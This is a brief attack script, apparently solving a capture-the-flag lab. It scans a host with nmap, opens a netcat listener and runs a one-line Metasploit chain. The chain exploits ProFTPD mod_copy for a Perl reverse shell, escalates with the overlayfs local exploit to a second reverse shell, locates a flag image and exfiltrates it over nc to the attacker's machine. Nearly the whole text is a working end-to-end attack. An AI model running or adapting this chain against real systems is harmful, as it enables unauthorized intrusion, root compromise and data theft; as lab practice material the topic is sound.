#This is a long string msfconsole command that executes an end to end attack
nmap -sV -Pn -T5 -sS 10.0.2.10

nc -l -p 1234 > 3_of_hearts.png &

/usr/bin/msfconsole -q -x "use exploit/unix/ftp/proftpd_modcopy_exec;set rhost 10.0.2.10;set sitepath /var/www/html;set payload cmd/unix/reverse_perl;set lhost 10.0.2.8;set lport 4567; run -j;sleep 10;sessions -i 1 -c 'whoami';sleep 10;sessions -i 1 -c 'groups';sleep 10;sessions -i 1 -c 'uname -a';sleep 10; use exploit/linux/local/overlayfs_priv_esc;set target 0;set session 1;set payload linux/x86/shell/reverse_tcp;set lhost 10.0.2.8;set lport 5678;run -j;sleep 60; sessions -i 2 -c 'whoami';sleep 10;sessions -i 2 -c 'find / -name 3_of_hearts.png';sleep 10;sessions -i 2 -c 'nc 10.0.2.8 1234 < /lost+found/3_of_hearts.png';sleep 10;exit -y"


